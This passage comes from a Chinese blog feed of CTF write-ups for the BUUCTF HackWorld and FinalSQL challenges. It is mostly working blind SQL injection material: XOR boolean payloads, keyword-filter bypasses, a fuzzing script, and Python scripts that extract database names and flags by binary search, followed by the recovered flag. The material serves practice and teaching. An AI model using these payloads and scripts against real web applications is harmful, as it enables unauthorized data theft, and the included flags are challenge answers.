schemma<br>该网站过滤了SEPARATOR<br>该网站过滤了XOR<br>该网站过滤了CURSOR<br>该网站过滤了FLOOR<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141224893.png" alt="image-20230828141224893"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141251957.png" alt="image-20230828141251957"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27;#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141354341.png" alt="image-20230828141354341"></p><p>所以由测试得该网站不回显数据库信息，只返回true或false的结果，所以我们需要采取盲注</p><p>2.选择盲注类型:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs txt">布尔盲注:<br>id=1 and 非0(true)或id=(1)and(非0(true))<br>返回id=1的界面<br>id=1 and 0(flase)或id=(1)and(0)<br>返回id=0的界面<br><br>异或盲注:<br>id=1^0(false)=&gt;1<br>返回id=1的界面<br>id=1^1(true)=&gt;0<br>返回id=0的界面<br>使用异或盲注需要后面有判断语句返回true和false<br><br>空字符或盲注:<br>id=&#x27;&#x27; or 非0(true)=&gt;1或id=&#x27;&#x27;or(非0(true))<br>返回id=1的界面<br>id=&#x27;&#x27; or 0(flase)=&gt;0或id=&#x27;&#x27;or(0)<br>返回id=0的界面<br></code></pre></td></tr></table></figure><p>由于and和or都被过滤，所以我们只能选择异或盲注</p><p>3.获取盲注true和false的界面</p><p>payload:</p><p>id&#x3D;0的界面</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828143418789.png" alt="image-20230828143418789"></p><p>payload:</p><p>id&#x3D;1的界面</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^0<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828143453303.png" alt="image-20230828143453303"></p><p>4.爆数据库信息:</p><p>由于limit被限制,所以长度规定可以为自由，使用GROUP_CONCAT()获取全部信息</p><p>第一步：直接爆数据库的名字:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^(ascii(substr(database(),1,1))&gt;79)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># 对数据库名字第n个字符进行暴力剖解</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># 手动规定数据库名字长度</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># 从可打印字符开始</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 对第n个字符进行判断</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>        <span class="hljs-comment"># payload1:用于普通盲注</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <br>        <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        payload2 = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">str</span><br>        &#125;<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        r = requests.post(url=url, data=payload2)<br>        <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>        true_text = <span class="hljs-string">&quot;Error&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># 返回true界面 </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 返回flase界面</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>    <span class="hljs-comment"># print(tmp)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的第%d个字符:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># 对下一个字符进行判断</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的名字为：&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">该数据库的名字为：ctftraih<br></code></pre></td></tr></table></figure><p>第二步：由于由题目提示得，flag在flag表的flag字段中，所以直接爆flag字段信息即可:</p><p>select被过滤的绕过方式:</p><p>大小写绕过法:</p><p>该方法适用于任何在mysql中执行的单词代码</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">seleCt<br>SeLeCt<br>SELect<br>.......<br></code></pre></td></tr></table></figure><p>测试:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828152946191.png" alt="image-20230828152946191"></p><p>内联注释绕过:</p><p>当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 &#x2F;*!  *&#x2F;中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">/*!select*/<br>/*!sElect*/<br>.....<br></code></pre></td></tr></table></figure><p>测试:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828153246186.png" alt="image-20230828153246186"></p><p>使用大小写绕过方式测试:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1seLeCt<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828153509802.png" alt="image-20230828153509802"></p><p>通过响应结果可知，可以绕过</p><p>由于group_concat也被过滤，且通过不断尝试，发现大小写都无法绕过，这里我们直接猜测该flag字段只有一行内容，且为flag的值</p><p>测试:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828154057973.png" alt="image-20230828154057973"></p><p>只有substr中select返回的只有一行内容时，才不会发生报错</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((seLEct(&#123;flag&#125;)from(&#123;flag&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;ctftraih&quot;</span><br><span class="hljs-comment"># table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1^(ascii(substr((seLEct(&#123;&#125;)from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(str)</span><br>            payload2 = &#123;<br>                <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">str</span><br>            &#125;<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.post(url=url, data=payload2)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;Error&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag字段第1列的值:flag&#123;8ee345ea-b7e7-4384-883c-f953214c7f79&#125; <br></code></pre></td></tr></table></figure><p>flag &#x3D; flag{8ee345ea-b7e7-4384-883c-f953214c7f79} </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[极客大挑战 2019]FinalSQL 题解</title>
    <link href="/2023/08/28/2023-08-28-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL/"/>
    <url>/2023/08/28/2023-08-28-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL/</url>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>1.进入页面:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094221524.png" alt="image-20230828094221524"></p><p>发现题目提示有盲注</p><p>2.由于我们不知道正确的用户名和密码，所以我们不能通过用户名密码的输入来获取true和false页面的响应，因为在不知道正确的用户名和密码的情况下，无论如何返回的都是false界面，所以我们需要寻找其它的盲注注入点</p><p>3.根据题目提示选择神秘代码:<br>点击1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094621301.png" alt="image-20230828094621301"></p><p>点击2：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094644745.png" alt="image-20230828094644745"></p><p>点击3：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094710975.png" alt="image-20230828094710975"></p><p>点击4：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094729078.png" alt="image-20230828094729078"></p><p>点击5：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094752529.png" alt="image-20230828094752529"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=6<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-FinalSQL/image-20230828094924021.png" alt="image-20230828094924021"></p><p>没有获得有用的信息，但是我们可以通过id这个注入点进行盲注</p><p>4.盲注原理:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs txt">布尔盲注:<br>id=1 and 非0(true)<br>返回id=1的界面<br>id=1 and 0(flase)<br>返回id=0的界面<br><br>异或盲注:<br>id=1^0(false)=&gt;1<br>返回id=1的界面<br>id=1^1(true)=&gt;0<br>返回id=0的界面<br>使用异或盲注需要后面有判断语句返回true和false<br><br>空字符或盲注:<br>id=&#x27;&#x27; or 非0(true)=&gt;1<br>返回id=1的界面<br>id=&#x27;&#x27; or 0(flase)=&gt;0<br>返回id=0的界面<br></code></pre></td></tr></table></figure><p>测试:</p><p>mysql中true表示1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828100019926.png" alt="image-20230828100019926"></p><p>mysql中false表示0:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828100110579.png" alt="image-20230828100110579"></p><p>5.随便注入，查看当前页面过滤的内容:</p><p>脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://3f8893c2-6eda-4113-bcfa-2b6188684bd7.node4.buuoj.cn:81/search.php?id=&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>    r = requests.get(url+data)<br>    <span class="hljs-comment"># 使用time使请求能够拥有足够的时间去响应</span><br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># 获取过滤网站响应信息</span><br>    reponse_txt = <span class="hljs-string">&quot;臭弟弟&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-comment"># for d in data_list:</span><br><span class="hljs-comment">#     payload = &#123;</span><br><span class="hljs-comment">#         &quot;&quot;: d</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url=url, data=payload)</span><br><span class="hljs-comment">#     reponse_txt = &quot;臭弟弟&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(data))</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs txt">该网站过滤了length Length<br>该网站过滤了handler<br>该网站过滤了likeLiKe<br>该网站过滤了having<br>该网站过滤了limitLimIt<br>该网站过滤了insertinsERTINSERT<br>该网站过滤了!<br>该网站过滤了%<br>该网站过滤了ANDANd<br>该网站过滤了BYBy<br>该网站过滤了unionUNIonUNION<br>该网站过滤了||<br>该网站过滤了//*<br>该网站过滤了*/*<br>该网站过滤了/**/<br>该网站过滤了anandd<br>该网站过滤了HAVING<br>该网站过滤了IF<br>该网站过滤了INTO<br>该网站过滤了LIKE<br>该网站过滤了|<br>该网站过滤了UNION<br>该网站过滤了AND<br>该网站过滤了drop<br>该网站过滤了DROP<br>该网站过滤了rand()<br>该网站过滤了LIMIT<br>该网站过滤了by<br>该网站过滤了OUTFILE<br>该网站过滤了VARCHAR<br>该网站过滤了/*<br>该网站过滤了mid<br>该网站过滤了RLIKE<br>该网站过滤了sys schemma<br>该网站过滤了%0c<br>该网站过滤了@<br>该网站过滤了else%27%23%22%20<br></code></pre></td></tr></table></figure><p>6.发现and被过滤，所以我们可以采用以下盲注：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">异或盲注:<br>id=1^0(false)=&gt;1<br>返回id=1的界面<br>id=1^1(true)=&gt;0<br>返回id=0的界面<br><br>空字符或盲注:<br>id=&#x27;&#x27; or 非0(true)=&gt;1<br>返回id=1的界面<br>id=&#x27;&#x27; or 0(flase)=&gt;0<br>返回id=0的界面<br></code></pre></td></tr></table></figure><p>测试:</p><p>返回id&#x3D;1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828140656279.png" alt="image-20230828140656279"></p><p>返回id&#x3D;0:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828140743288.png" alt="image-20230828140743288"></p><p><strong>使用异或盲注构造payload,由于过滤了limit,所以不能用普通的payload:</strong></p><p>第一步：爆数据库名字的长度,由于length被过滤，所以我们采取暴力破解（规定查找长度为30）</p><p>第二步：爆数据库的名字</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br>headers = &#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;</span>,<br>           <span class="hljs-string">&#x27;Referer&#x27;</span>:<span 